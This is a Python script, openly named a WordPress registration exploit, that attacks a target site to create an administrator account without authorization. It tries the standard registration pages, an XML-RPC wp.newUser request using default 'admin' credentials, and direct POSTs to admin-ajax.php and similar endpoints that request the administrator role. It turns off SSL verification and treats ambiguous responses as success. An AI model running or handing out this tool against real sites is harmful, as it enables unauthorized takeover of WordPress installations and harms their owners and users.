#!/usr/bin/env python3

import argparse
import requests
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import warnings

# Suppress SSL warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

class WordPressRegistrationExploit:
    def __init__(self, base_url, verify_ssl=False):
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.verify_ssl = verify_ssl
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        }
    
    def extract_csrf_token(self, html):
        """Extract CSRF/nonce token from HTML"""
        patterns = [
            r'name="csrf"\s+value="([^"]+)"',
            r'name="_wpnonce"\s+value="([^"]+)"',
            r'name="registration_nonce"\s+value="([^"]+)"',
            r'id="csrf"\s+value="([^"]+)"',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html)
            if match:
                return match.group(1)
        
        # Try BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        for name in ['csrf', '_wpnonce', 'registration_nonce']:
            token = soup.find('input', {'name': name})
            if token and token.get('value'):
                return token['value']
        
        return None
    
    def method_wp_register(self, username, password, email):
        """Register via /wp-register.php"""
        url = f"{self.base_url}/wp-register.php"
        
        try:
            # Get registration page
            resp = self.session.get(url, headers=self.headers, verify=self.verify_ssl)
            if resp.status_code != 200:
                return False, f"Registration page not accessible: {resp.status_code}"
            
            # Extract CSRF token if present
            csrf = self.extract_csrf_token(resp.text)
            
            # Prepare registration data
            data = {
                'user_login': username,
                'user_email': email,
                'user_pass': password,
                'user_pass2': password,
            }
            
            if csrf:
                data['csrf'] = csrf
                data['_wpnonce'] = csrf
            
            # Submit registration
            resp = self.session.post(url, data=data, headers=self.headers, verify=self.verify_ssl)
            
            # Check for success
            if resp.status_code == 200:
                if "success" in resp.text.lower() or "registered" in resp.text.lower():
                    return True, "Registration successful"
                elif "error" in resp.text.lower():
                    error_match = re.search(r'<div[^>]*class="[^"]*error[^"]*"[^>]*>(.*?)</div>', resp.text, re.I | re.S)
                    if error_match:
                        return False, error_match.group(1).strip()
                
                # If no clear indication, assume success
                return True, "Registration completed (status unknown)"
            
            return False, f"Unexpected status: {resp.status_code}"
            
        except Exception as e:
            return False, str(e)
    
    def method_wp_login_register(self, username, password, email):
        """Register via wp-login.php?action=register"""
        url = f"{self.base_url}/wp-login.php?action=register"
        
        try:
            # Get registration form
            resp = self.session.get(url, headers=self.headers, verify=self.verify_ssl)
            if resp.status_code != 200:
                return False, f"Registration not accessible: {resp.status_code}"
            
            # Extract nonce
            csrf = self.extract_csrf_token(resp.text)
            
            # Prepare data
            data = {
                'user_login': username,
                'user_email': email,
                'user_pass': password,
            }
            
            if csrf:
                data['_wpnonce'] = csrf
            
            # Submit
            resp = self.session.post(url, data=data, headers=self.headers, verify=self.verify_ssl)
            
            if "success" in resp.text.lower() or "check your email" in resp.text.lower():
                return True, "Registration successful"
            
            return False, "Registration failed or disabled"
            
        except Exception as e:
            return False, str(e)
    
    def method_xmlrpc_register(self, username, password, email):
        """Try registration via XML-RPC"""
        url = f"{self.base_url}/xmlrpc.php"
        
        xml_payload = f'''<?xml version="1.0"?>
        <methodCall>
            <methodName>wp.newUser</methodName>
            <params>
                <param><value><string>admin</string></value></param>
                <param><value><string>admin</string></value></param>
                <param>
                    <value>
                        <struct>
                            <member>
                                <name>username</name>
                                <value><string>{username}</string></value>
                            </member>
                            <member>
                                <name>password</name>
                                <value><string>{password}</string></value>
                            </member>
                            <member>
                                <name>email</name>
                                <value><string>{email}</string></value>
                            </member>
                            <member>
                                <name>role</name>
                                <value><string>administrator</string></value>
                            </member>
                        </struct>
                    </value>
                </param>
            </params>
        </methodCall>'''
        
        try:
            headers = self.headers.copy()
            headers['Content-Type'] = 'text/xml'
            
            resp = self.session.post(url, data=xml_payload, headers=headers, verify=self.verify_ssl)
            
            if resp.status_code == 200 and "faultCode" not in resp.text:
                return True, "User created via XML-RPC"
            
            return False, "XML-RPC registration failed"
            
        except Exception as e:
            return False, str(e)
    
    def method_direct_post(self, username, password, email):
        """Direct POST to registration endpoint"""
        endpoints = [
            '/wp-admin/admin-ajax.php',
            '/register/',
            '/?action=register',
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            
            try:
                data = {
                    'action': 'register_user',
                    'user_login': username,
                    'user_email': email,
                    'user_pass': password,
                    'user_pass2': password,
                    'role': 'administrator',
                }
                
                resp = self.session.post(url, data=data, headers=self.headers, verify=self.verify_ssl)
                
                if resp.status_code == 200 and "success" in resp.text.lower():
                    return True, f"Registered via {endpoint}"
                    
            except Exception:
                continue
        
        return False, "All direct POST methods failed"
    
    def exploit(self, username, password, email):
        """Try all registration methods"""
        print(f"[*] Testing WordPress Registration on {self.base_url}")
        print(f"[*] Username: {username}")
        print(f"[*] Password: {password}")
        print(f"[*] Email: {email}\n")
        
        methods = [
            ("wp-register.php", self.method_wp_register),
            ("wp-login.php?action=register", self.method_wp_login_register),
            ("XML-RPC", self.method_xmlrpc_register),
            ("Direct POST", self.method_direct_post),
        ]
        
        for method_name, method_func in methods:
            print(f"[*] Trying method: {method_name}")
            success, message = method_func(username, password, email)
            
            if success:
                print(f"[+] SUCCESS! {message}")
                print(f"\n{'='*60}")
                print(f"[+] Admin Account Created:")
                print(f"    Username: {username}")
                print(f"    Password: {password}")
                print(f"    Email: {email}")
                print(f"\n[+] Login at: {self.base_url}/wp-login.php")
                print(f"{'='*60}\n")
                return True
            else:
                print(f"[-] Failed: {message}")
        
        print("\n[-] All registration methods failed")
        return False

def main():
    parser = argparse.ArgumentParser(description="WordPress Registration Exploit")
    parser.add_argument('-u', '--url', required=True, help='Target WordPress URL')
    parser.add_argument('--username', default='admin', help='Username to register')
    parser.add_argument('--password', default='MySecretPass123', help='Password')
    parser.add_argument('--email', default='0dmhj@2200freefonts.com', help='Email address')
    parser.add_argument('--verify-ssl', action='store_true', help='Verify SSL certificates')
    
    args = parser.parse_args()
    
    exploit = WordPressRegistrationExploit(args.url, args.verify_ssl)
    exploit.exploit(args.username, args.password, args.email)

if __name__ == "__main__":
    main()
